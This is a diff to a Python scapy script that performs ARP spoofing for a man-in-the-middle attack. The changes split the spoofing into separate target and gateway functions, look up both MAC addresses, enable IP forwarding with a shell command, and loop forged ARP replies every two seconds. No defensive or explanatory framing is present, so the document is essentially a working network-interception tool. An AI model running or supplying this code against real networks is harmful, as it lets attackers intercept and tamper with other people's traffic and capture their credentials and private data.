@@ -37,8 +37,11 @@ def mitm_mac(mitm_interface):
 
 
 def arp_spoof_target(target_ip, gateway_ip):
-    target_mac = get_mac(target_ip)
     packet = scapy.ARP(op=2, pdst=str(target_ip), hwdst=target_mac, psrc=gateway_ip)
+    scapy.send(packet)
+
+def arp_spoof_gateway(gateway_ip, target_ip):
+    packet = scapy.ARP(op=2, pdst=str(gateway_ip), hwdst=gateway_mac, psrc=target_ip)
     scapy.send(packet)
 
 
@@ -53,14 +56,20 @@ print("[ ] Script Started.")
 print("[+] Enabling Traffic Flow..")
 subprocess.check_call("echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True)
 print("[+] Enabled Traffic Flow!")
-# print("[+] Querying for MAC Address..")
+print("[+] Querying for Target MAC Address..")
+target_mac = get_mac(options.target_ip)
+print("[+] Querying for Gateway MAC Address..")
+gateway_mac = get_mac(options.gateway_ip)
 # mitm_mac_address = mitm_mac(options.mitm_interface)
+print("[+] Initiating Attack..")
 while True:
     print("[+] Spoofing Target..")
     arp_spoof_target(options.target_ip, options.gateway_ip)
     print("[+] Spoofed Target!")
     print("[+] Spoofing Gateway..")
-    arp_spoof_target(options.gateway_ip, options.target_ip)
+    arp_spoof_gateway(options.gateway_ip, options.target_ip)
     print("[+] Spoofed Gateway!")
+    print("[+] Waiting for 2 seconds..")
     time.sleep(2)
+    print("[+] Looping attack.")
 print("[X] Script completed!")
